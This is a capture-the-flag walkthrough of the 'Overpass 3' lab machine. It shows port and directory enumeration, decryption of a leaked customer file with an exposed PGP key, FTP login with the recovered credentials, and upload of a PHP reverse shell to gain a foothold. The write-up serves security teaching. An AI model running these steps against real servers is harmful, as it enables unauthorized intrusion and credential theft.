# Overpass 3 - Hosting
---

You know them, you love them, your favourite group of broke computer science students
have another business venture! Show them that they probably should hire someone for 
security...

After Overpass's rocky start in infosec, and the commercial failure of their password
manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!\
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their
main web server is extremely vulnerable.

---

As usual, we start by checking open services on the target machine:
```
$ sudo nmap -sV <target_ip> -Pn -n --disable-arp-ping  

<...snip...>
Host is up (0.042s latency).
Not shown: 986 filtered tcp ports (no-response), 11 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
```

We can try connect anonymously to the FTP server, but this doesn't work. We continue
by enumerating the web app:
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://<target_ip>/FUZZ

<...snip...>
.hta                    [Status: 403, Size: 213, Words: 16, Lines: 10, Duration: 41ms]
.htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 46ms]
.htpasswd               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 45ms]
backups                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 38ms]
cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10, Duration: 41ms]
index.html              [Status: 200, Size: 1770, Words: 443, Lines: 37, Duration: 36ms]
:: Progress: [4727/4727] :: Job [1/1] :: 975 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

The backups directory looks interesting.\
There we find an downloadable zip file. This file contains a PGP key and an encrypted `xlsx` document:

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/eb1a77ec-5001-4cd8-b8f1-ca79b8f29e8d)

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/b59e2b4e-c657-45c2-a05f-814279688639)


We can decrypt our `xlsx` file using that key. The process is pretty straight forward:
```
$ gpg --import priv.key

gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                              
$ gpg --decrypt CustomerDetails.xlsx.gpg > CustumerDetails.xlsx
```

Once decrypted, we find that it contains sensitive information about some users.

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/8518a7cf-3dc2-4fdd-a342-bfd1c62bccd6)

These credentials are important and in our case can be used to connect to ssh and/or ftp 
servers. That being said, the only credentials that prove to be useful are those belonging
to Paradox. We can use then to connect to FTP. Once connected, we upload a php reverse shell
to the server and then access from the web app:
```
$ ftp paradox@<target_ip>      

Connected to <target_ip>.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.

ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||28139|)
150 Ok to send data.
100% |*************************************************|  5492        1.00 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (63.89 KiB/s)
```

Now we got initial access to the machine as the user `apache`. The web flag is at `/usr/share/httpd`.

